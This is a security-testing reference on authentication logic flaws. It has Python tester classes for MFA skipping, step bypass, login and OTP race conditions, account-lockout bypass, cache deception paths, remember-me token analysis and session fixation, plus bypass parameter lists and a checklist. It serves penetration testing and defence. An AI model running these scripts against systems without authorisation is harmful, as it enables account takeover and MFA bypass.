# Authentication Logic Flaws

## Overview

Authentication logic flaws arise from incorrect assumptions about state transitions, sequence of operations, and session lifecycle. This document covers state machine violations, multi-step auth bypass, parallel session exploitation, authentication caching abuse, remember-me token prediction, and session fixation chains. These are among the most impactful and commonly missed vulnerabilities.

**Key Sources**:
- https://portswigger.net/web-security/authentication/multi-factor
- https://blog.silentsignal.eu/2025/06/14/gitblit-cve-CVE-2024-28080/
- https://medium.com/infosecmatrix/5-11-lab-authentication-bypass-via-flawed-state-machine-2024-2226d33fba6d

---

## 1. State Machine Violations

### 1.1 Authentication State Machine Model

**Normal Authentication Flow**:
```
[UNAUTHENTICATED] -> [CREDENTIALS_SUBMITTED] -> [MFA_PENDING] -> [AUTHENTICATED]
                                                                       |
                                                                       v
                                                              [SESSION_ACTIVE]
```

**Flawed State Machine - Common Bypass Patterns**:
```
Pattern 1: Skip MFA Step
  [CREDENTIALS_SUBMITTED] -> [SESSION_ACTIVE]  (bypass MFA_PENDING)

Pattern 2: Direct Navigation
  [UNAUTHENTICATED] -> [SESSION_ACTIVE]  (navigate directly to authenticated page)

Pattern 3: State Reset
  [MFA_PENDING] -> [UNAUTHENTICATED] -> [CREDENTIALS_SUBMITTED] -> [SESSION_ACTIVE]
  (reset back, re-authenticate, skip MFA)

Pattern 4: Parallel State
  Thread 1: [CREDENTIALS_SUBMITTED] -> [MFA_PENDING]
  Thread 2: [CREDENTIALS_SUBMITTED] -> [SESSION_ACTIVE]  (race condition)
```

### 1.2 State Machine Bypass Testing

```python
#!/usr/bin/env python3
"""Authentication State Machine Bypass Tester"""

import requests
import time

class StateMachineBypassTester:
    """Test authentication state machine for logic flaws."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_mfa_skip(self, username, password):
        """Test if MFA step can be skipped by directly accessing authenticated endpoints."""
        session = requests.Session()

        # Step 1: Submit credentials
        resp = session.post(
            f"{self.target_url}/api/login",
            json={'username': username, 'password': password}
        )

        if resp.status_code != 200:
            return {'error': 'Login failed'}

        # Step 2: Instead of completing MFA, try to access protected resources
        protected_endpoints = [
            '/api/me', '/api/dashboard', '/api/user/profile',
            '/api/settings', '/api/account', '/dashboard',
            '/home', '/admin', '/api/v1/user',
        ]

        results = []
        for endpoint in protected_endpoints:
            check = session.get(f"{self.target_url}{endpoint}")
            results.append({
                'endpoint': endpoint,
                'status': check.status_code,
                'mfa_bypassed': check.status_code == 200,
            })

        return results

    def test_step_skip(self, username, password):
        """Test if authentication steps can be skipped via URL manipulation."""
        session = requests.Session()

        # Try accessing step-specific URLs out of order
        step_urls = [
            '/auth/step1',  # Username
            '/auth/step2',  # Password
            '/auth/step3',  # MFA
            '/auth/step4',  # Role selection
            '/auth/complete',  # Final
        ]

        results = []
        for i, url in enumerate(step_urls):
            # Try each step directly without completing previous steps
            resp = session.get(f"{self.target_url}{url}")
            results.append({
                'step': i + 1,
                'url': url,
                'accessible': resp.status_code == 200,
                'redirected': resp.status_code == 302,
            })

        # Test jumping to completion
        resp = session.post(
            f"{self.target_url}/auth/complete",
            json={'username': username}
        )
        results.append({
            'step': 'direct_complete',
            'accessible': resp.status_code == 200,
        })

        return results

    def test_forced_browsing(self, session_cookie):
        """Test if partial auth session grants access via forced browsing."""
        # Use session cookie from partial authentication
        cookies = {'session': session_cookie}

        targets = [
            '/dashboard', '/admin', '/api/users',
            '/api/me', '/settings', '/profile',
            '/api/admin/users', '/api/export',
        ]

        results = []
        for target in targets:
            resp = requests.get(f"{self.target_url}{target}", cookies=cookies)
            results.append({
                'target': target,
                'status': resp.status_code,
                'authenticated': resp.status_code == 200 and 'login' not in resp.url
            })

        return results

    def test_method_change(self, username, password):
        """Test if changing HTTP method bypasses auth checks."""
        session = requests.Session()

        # Login normally
        session.post(f"{self.target_url}/api/login",
                    json={'username': username, 'password': password})

        # Test different methods on authenticated endpoints
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
        endpoint = '/api/admin/users'

        results = []
        for method in methods:
            resp = session.request(method, f"{self.target_url}{endpoint}")
            results.append({
                'method': method,
                'status': resp.status_code,
                'accessible': resp.status_code not in [401, 403, 404, 405]
            })

        return results
```

---

## 2. Multi-Step Authentication Bypass

### 2.1 Step Manipulation Techniques

```python
class MultiStepBypass:
    """Bypass multi-step authentication flows."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_parameter_manipulation(self, username, password):
        """Manipulate step parameters to skip verification."""
        session = requests.Session()

        # Login step
        session.post(f"{self.target_url}/api/login",
                    json={'username': username, 'password': password})

        # Try to indicate MFA is already complete
        bypass_params = [
            {'mfa_verified': True},
            {'mfa_verified': 'true'},
            {'step': 'complete'},
            {'step': '3'},
            {'auth_complete': True},
            {'skip_mfa': True},
            {'mfa_status': 'verified'},
            {'verified': True},
            {'2fa_done': True},
            {'auth_step': 'final'},
        ]

        results = []
        for params in bypass_params:
            resp = session.post(
                f"{self.target_url}/api/auth/verify",
                json=params
            )
            results.append({
                'params': params,
                'status': resp.status_code,
                'bypassed': resp.status_code == 200
            })

        return results

    def test_response_manipulation(self, username, password):
        """
        Document response manipulation attacks.
        These require Burp Suite or similar proxy to modify responses.
        """
        return {
            'technique': 'Response Manipulation',
            'steps': [
                '1. Submit credentials to login endpoint',
                '2. Intercept the MFA challenge response',
                '3. Modify response body:',
                '   - Change "mfa_required": true to false',
                '   - Change "status": "mfa_pending" to "authenticated"',
                '   - Remove MFA challenge from response',
                '   - Add session token to response',
                '4. Forward modified response to browser',
                '5. Application may treat user as fully authenticated',
            ],
            'payloads': [
                {'original': '{"mfa_required": true}', 'modified': '{"mfa_required": false}'},
                {'original': '{"status": "pending"}', 'modified': '{"status": "success"}'},
                {'original': '{"authenticated": false}', 'modified': '{"authenticated": true}'},
                {'original': '{"next_step": "/mfa"}', 'modified': '{"next_step": "/dashboard"}'},
            ],
            'tools': ['Burp Suite (Match and Replace)', 'mitmproxy', 'ZAP']
        }

    def test_token_from_partial_auth(self, username, password):
        """Test if token from partial auth (pre-MFA) has any valid permissions."""
        session = requests.Session()

        # Step 1: Submit credentials only
        resp = session.post(
            f"{self.target_url}/api/login",
            json={'username': username, 'password': password}
        )

        # Extract any tokens from partial auth
        tokens = {
            'cookies': dict(session.cookies),
            'headers': {k: v for k, v in resp.headers.items()
                       if 'token' in k.lower() or 'auth' in k.lower()},
            'body_tokens': {}
        }

        if resp.ok:
            data = resp.json()
            for key in ['token', 'access_token', 'session_token', 'jwt', 'temp_token']:
                if key in data:
                    tokens['body_tokens'][key] = data[key]

        # Test each token against protected endpoints
        results = []
        for token_source, token_data in tokens.items():
            if isinstance(token_data, dict):
                for name, value in token_data.items():
                    resp = requests.get(
                        f"{self.target_url}/api/me",
                        headers={'Authorization': f'Bearer {value}'},
                        cookies={name: value}
                    )
                    results.append({
                        'token_source': token_source,
                        'token_name': name,
                        'valid': resp.status_code == 200,
                        'response': resp.text[:200]
                    })

        return results
```

---

## 3. Parallel Session Exploitation

### 3.1 Race Condition in Authentication

```python
#!/usr/bin/env python3
"""Authentication Race Condition Exploiter"""

import requests
import threading
import time

class AuthRaceCondition:
    """Exploit race conditions in authentication flows."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_concurrent_login(self, username, password, threads=20):
        """Test for race conditions in login processing."""
        results = []
        barrier = threading.Barrier(threads)

        def login(thread_id):
            session = requests.Session()
            barrier.wait()  # Synchronize start

            resp = session.post(
                f"{self.target_url}/api/login",
                json={'username': username, 'password': password}
            )

            results.append({
                'thread': thread_id,
                'status': resp.status_code,
                'cookies': dict(session.cookies),
                'body': resp.json() if resp.ok else resp.text[:200],
            })

        thread_list = [threading.Thread(target=login, args=(i,)) for i in range(threads)]
        for t in thread_list:
            t.start()
        for t in thread_list:
            t.join()

        # Analyze: multiple sessions from one login?
        valid_sessions = [r for r in results if r['status'] == 200]
        unique_sessions = set(
            r['cookies'].get('session', r['body'].get('token', ''))
            for r in valid_sessions if isinstance(r.get('body'), dict)
        )

        return {
            'total_requests': threads,
            'successful_logins': len(valid_sessions),
            'unique_sessions': len(unique_sessions),
            'race_condition': len(unique_sessions) > 1,
            'results': results
        }

    def test_mfa_race(self, session_cookie, correct_otp, threads=20):
        """Race condition in MFA verification - submit correct + wrong OTPs simultaneously."""
        results = []
        barrier = threading.Barrier(threads)

        def submit_otp(thread_id, otp):
            barrier.wait()
            resp = requests.post(
                f"{self.target_url}/api/mfa/verify",
                json={'otp': otp},
                cookies={'session': session_cookie}
            )
            results.append({
                'thread': thread_id,
                'otp': otp,
                'status': resp.status_code,
                'success': resp.status_code == 200
            })

        thread_list = []
        for i in range(threads):
            # Mix correct and wrong OTPs
            otp = correct_otp if i % 2 == 0 else str(100000 + i).zfill(6)
            t = threading.Thread(target=submit_otp, args=(i, otp))
            thread_list.append(t)
            t.start()

        for t in thread_list:
            t.join()

        # Check if wrong OTPs succeeded (race condition)
        wrong_but_success = [r for r in results if r['otp'] != correct_otp and r['success']]
        return {
            'race_condition': len(wrong_but_success) > 0,
            'wrong_otps_accepted': len(wrong_but_success),
            'results': results
        }

    def test_account_lockout_race(self, username, threads=50):
        """Test if account lockout can be bypassed via race condition."""
        results = []
        barrier = threading.Barrier(threads)

        def try_login(thread_id):
            barrier.wait()
            resp = requests.post(
                f"{self.target_url}/api/login",
                json={'username': username, 'password': f'attempt_{thread_id}'}
            )
            results.append({
                'thread': thread_id,
                'status': resp.status_code,
                'locked': resp.status_code == 429 or 'locked' in resp.text.lower()
            })

        thread_list = [threading.Thread(target=try_login, args=(i,)) for i in range(threads)]
        for t in thread_list:
            t.start()
        for t in thread_list:
            t.join()

        # If all 50 attempts went through without lockout, there is a race condition
        locked_at = next((r['thread'] for r in sorted(results, key=lambda x: x['thread'])
                         if r['locked']), None)

        return {
            'lockout_bypassed': locked_at is None or locked_at > 10,
            'first_lockout_at': locked_at,
            'total_attempts': len(results),
            'results': results
        }
```

---

## 4. Authentication Caching Abuse

### 4.1 Cache Poisoning for Auth Bypass

```python
class AuthCachingAbuse:
    """Exploit authentication response caching."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_response_caching(self):
        """Test if authenticated responses are cached and served to other users."""
        # Step 1: Make authenticated request
        auth_session = requests.Session()
        auth_session.post(f"{self.target_url}/api/login",
                         json={'username': 'admin', 'password': 'test'})
        auth_resp = auth_session.get(f"{self.target_url}/api/me")

        # Step 2: Make unauthenticated request to same endpoint
        unauth_resp = requests.get(f"{self.target_url}/api/me")

        # Step 3: Compare - if unauth gets auth data, caching is broken
        return {
            'auth_data': auth_resp.text[:200],
            'unauth_data': unauth_resp.text[:200],
            'cache_leaking': auth_resp.text == unauth_resp.text and auth_resp.status_code == 200,
            'cache_headers': {
                'cache_control': unauth_resp.headers.get('Cache-Control'),
                'vary': unauth_resp.headers.get('Vary'),
                'age': unauth_resp.headers.get('Age'),
                'x_cache': unauth_resp.headers.get('X-Cache'),
            }
        }

    def test_cache_key_manipulation(self):
        """Test if cache key can be manipulated to serve wrong content."""
        # Web cache deception / cache poisoning in auth context
        payloads = [
            '/api/me/nonexistent.css',  # Cacheable extension
            '/api/me/image.jpg',
            '/api/me/..%2fme',
            '/api/me%00.js',
            '/api/me;.css',
        ]

        results = []
        for payload in payloads:
            # Authenticated request with modified path
            resp = requests.get(f"{self.target_url}{payload}")
            results.append({
                'path': payload,
                'status': resp.status_code,
                'cached': 'HIT' in resp.headers.get('X-Cache', ''),
                'contains_user_data': 'username' in resp.text.lower() or 'email' in resp.text.lower()
            })

        return results
```

---

## 5. Remember-Me Token Prediction

### 5.1 Remember-Me Token Analysis

```python
class RememberMeAnalyzer:
    """Analyze and exploit remember-me token implementations."""

    def __init__(self, target_url):
        self.target_url = target_url

    def collect_tokens(self, username, password, count=50):
        """Collect multiple remember-me tokens for analysis."""
        tokens = []
        for i in range(count):
            session = requests.Session()
            resp = session.post(
                f"{self.target_url}/api/login",
                json={'username': username, 'password': password, 'remember_me': True}
            )

            remember_token = session.cookies.get('remember_me') or \
                            session.cookies.get('remember_token') or \
                            session.cookies.get('persistent_session')

            if remember_token:
                tokens.append({
                    'token': remember_token,
                    'timestamp': time.time(),
                    'index': i
                })

            # Logout to get fresh token
            session.post(f"{self.target_url}/api/logout")
            time.sleep(0.5)

        return tokens

    def analyze_tokens(self, tokens):
        """Analyze remember-me tokens for predictability."""
        import base64
        import hashlib

        analysis = {
            'total': len(tokens),
            'unique': len(set(t['token'] for t in tokens)),
            'patterns': [],
            'token_format': None,
        }

        # Check for base64-encoded content
        for token_data in tokens[:5]:
            try:
                decoded = base64.b64decode(token_data['token'])
                analysis['token_format'] = 'base64'
                # Check if it contains readable data
                try:
                    text = decoded.decode('utf-8')
                    if ':' in text or '|' in text:
                        parts = text.split(':') if ':' in text else text.split('|')
                        analysis['patterns'].append({
                            'type': 'STRUCTURED_TOKEN',
                            'parts': len(parts),
                            'example_parts': [p[:10] + '...' for p in parts],
                            'severity': 'HIGH'
                        })
                except:
                    pass
            except:
                pass

        # Check for sequential/predictable tokens
        token_values = [t['token'] for t in tokens]
        try:
            int_values = [int(t, 16) for t in token_values]
            diffs = [int_values[i+1] - int_values[i] for i in range(len(int_values)-1)]
            if len(set(diffs)) < len(diffs) / 2:
                analysis['patterns'].append({
                    'type': 'SEQUENTIAL',
                    'severity': 'CRITICAL',
                    'common_diff': max(set(diffs), key=diffs.count)
                })
        except:
            pass

        # Check for timestamp-based tokens
        for token_data in tokens:
            ts_str = str(int(token_data['timestamp']))
            if ts_str in token_data['token']:
                analysis['patterns'].append({
                    'type': 'TIMESTAMP_BASED',
                    'severity': 'HIGH'
                })
                break

        # Check entropy
        all_bytes = ''.join(token_values).encode()
        byte_freq = {}
        for b in all_bytes:
            byte_freq[b] = byte_freq.get(b, 0) + 1
        from math import log2
        total = len(all_bytes)
        entropy = -sum((c/total) * log2(c/total) for c in byte_freq.values())
        analysis['entropy_per_byte'] = entropy

        if entropy < 4.0:
            analysis['patterns'].append({
                'type': 'LOW_ENTROPY',
                'entropy': entropy,
                'severity': 'HIGH'
            })

        return analysis

    def test_token_reuse_after_password_change(self, remember_token, new_session):
        """Test if remember-me token survives password change."""
        # Use old remember-me token
        resp = requests.get(
            f"{self.target_url}/api/me",
            cookies={'remember_me': remember_token}
        )
        return {
            'still_valid': resp.status_code == 200,
            'vulnerability': 'Remember-me token not invalidated after password change'
                            if resp.status_code == 200 else None
        }

    def test_token_fixation(self):
        """Test if a remember-me token can be set before authentication."""
        session = requests.Session()

        # Set an arbitrary remember-me cookie before login
        session.cookies.set('remember_me', 'attacker_controlled_value')

        # Now login
        resp = session.post(
            f"{self.target_url}/api/login",
            json={'username': 'test', 'password': 'test', 'remember_me': True}
        )

        # Check if the pre-set token is used
        new_token = session.cookies.get('remember_me')
        return {
            'token_fixated': new_token == 'attacker_controlled_value',
            'new_token': new_token,
            'vulnerability': 'Remember-me token fixation possible'
                            if new_token == 'attacker_controlled_value' else None
        }
```

---

## 6. Session Fixation Chains

### 6.1 Advanced Session Fixation

```python
class SessionFixationChain:
    """Advanced session fixation attack chains."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_session_fixation(self):
        """Test if pre-auth session ID survives authentication."""
        session = requests.Session()

        # Get pre-auth session
        session.get(self.target_url)
        pre_auth_session = dict(session.cookies)

        # Login
        session.post(
            f"{self.target_url}/api/login",
            json={'username': 'test', 'password': 'test'}
        )
        post_auth_session = dict(session.cookies)

        # Check if session ID changed
        session_cookies = ['session', 'JSESSIONID', 'PHPSESSID', 'ASP.NET_SessionId',
                          'connect.sid', '_session', 'sid']

        results = {}
        for cookie in session_cookies:
            pre = pre_auth_session.get(cookie)
            post = post_auth_session.get(cookie)
            if pre and post:
                results[cookie] = {
                    'changed': pre != post,
                    'fixation_possible': pre == post,
                    'vulnerability': 'Session fixation' if pre == post else None
                }

        return results

    def test_cross_subdomain_fixation(self, subdomains):
        """Test session fixation across subdomains."""
        results = []
        for subdomain in subdomains:
            session = requests.Session()
            # Set session cookie for parent domain from subdomain
            session.cookies.set('session', 'fixed_value',
                              domain=f'.{subdomain.split(".", 1)[1]}')

            # Try to use this fixed session on main domain
            resp = session.get(f"https://{subdomain}/api/me")
            results.append({
                'subdomain': subdomain,
                'cookie_accepted': resp.cookies.get('session') == 'fixed_value',
            })

        return results

    def test_fixation_via_url(self):
        """Test if session ID can be set via URL parameter."""
        url_params = [
            'JSESSIONID', 'sessionid', 'sid', 'session',
            'token', 'auth_token', 'PHPSESSID',
        ]

        results = []
        for param in url_params:
            resp = requests.get(
                f"{self.target_url}/login?{param}=attacker_session_id",
                allow_redirects=False
            )
            # Check if the session was set
            for cookie in resp.cookies:
                if cookie.value == 'attacker_session_id':
                    results.append({
                        'param': param,
                        'fixation_possible': True,
                        'severity': 'HIGH'
                    })

        return results
```

---

## 7. Testing Checklist

```
# State Machine
[ ] Test MFA skip via direct endpoint access
[ ] Test step skipping in multi-step auth
[ ] Test forced browsing with partial session
[ ] Test HTTP method change bypass
[ ] Test parameter manipulation for step skip
[ ] Test response manipulation via proxy

# Race Conditions
[ ] Test concurrent login requests
[ ] Test MFA verification race condition
[ ] Test account lockout bypass via race
[ ] Test session creation race condition

# Caching
[ ] Test response caching of auth endpoints
[ ] Test cache key manipulation
[ ] Test web cache deception on auth pages

# Remember-Me
[ ] Collect and analyze token patterns
[ ] Test token predictability
[ ] Test token reuse after password change
[ ] Test token fixation
[ ] Test token expiration

# Session Fixation
[ ] Test session regeneration on login
[ ] Test cross-subdomain fixation
[ ] Test URL-based session fixation
[ ] Test session binding to IP/UA
```

---

## References

- PortSwigger Multi-Factor Auth: https://portswigger.net/web-security/authentication/multi-factor
- Auth State Machine Bypass Lab: https://medium.com/infosecmatrix/5-11-lab-authentication-bypass-via-flawed-state-machine-2024-2226d33fba6d
- CVE-2024-28080 Gitblit State Machine: https://blog.silentsignal.eu/2025/06/14/gitblit-cve-CVE-2024-28080/
- OWASP Testing Guide - Session Management: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/
- OWASP Session Fixation: https://owasp.org/www-community/attacks/Session_fixation
